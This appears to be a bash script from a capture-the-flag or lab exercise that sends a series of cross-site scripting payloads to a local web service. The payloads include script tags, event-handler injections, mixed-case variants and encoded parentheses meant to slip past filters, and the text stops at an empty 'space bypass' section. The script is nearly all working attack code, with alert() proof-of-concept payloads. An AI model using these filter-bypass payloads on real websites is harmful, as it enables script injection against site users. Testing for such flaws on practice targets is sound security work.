# Create a function to test XSS payloads
test_xss_payload() {
  local payload="$1"
  local description="$2"
  
  echo -e "\n--- $description ---"
  echo "Payload: $payload"
  
  # URL encode the payload
  encoded_payload=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload', safe=''))")
  echo "URL Encoded: $encoded_payload"
  
  # Send request
  curl -s "http://127.0.0.1:32810/page?name=$encoded_payload" | grep -i "$payload" | head -3
}

echo -e "\n=== BASIC XSS PAYLOADS ==="
test_xss_payload "<script>alert('XSS')</script>" "Basic script tag"
test_xss_payload "<img src=x onerror=alert('XSS')>" "Image onerror event"
test_xss_payload "<svg/onload=alert('XSS')>" "SVG onload event"
test_xss_payload "<body onload=alert('XSS')>" "Body onload event"

echo -e "\n=== EVENT HANDLER PAYLOADS ==="
test_xss_payload "<input autofocus onfocus=alert('XSS')>" "Input onfocus event"
test_xss_payload "<details open ontoggle=alert('XSS')>" "Details ontoggle event"
test_xss_payload "<video><source onerror=alert('XSS')>" "Video source onerror"
test_xss_payload "<audio src=x onerror=alert('XSS')>" "Audio onerror event"

echo -e "\n=== CASE VARIATIONS ==="
test_xss_payload "<ScRiPt>alert('XSS')</ScRiPt>" "Mixed case script"
test_xss_payload "<iMg SrC=x OnErRoR=alert('XSS')>" "Mixed case image"
test_xss_payload "<SvG/oNlOaD=alert('XSS')>" "Mixed case SVG"

echo -e "\n=== URL/DOT ENCODING ==="
test_xss_payload "<img src=x onerror=alert%28'XSS'%29>" "URL encoded parenthesis"
test_xss_payload "<img src=x onerror=alert&#40;'XSS'&#41>" "HTML entity parenthesis"

echo -e "\n=== SPACE BYPASS ==="
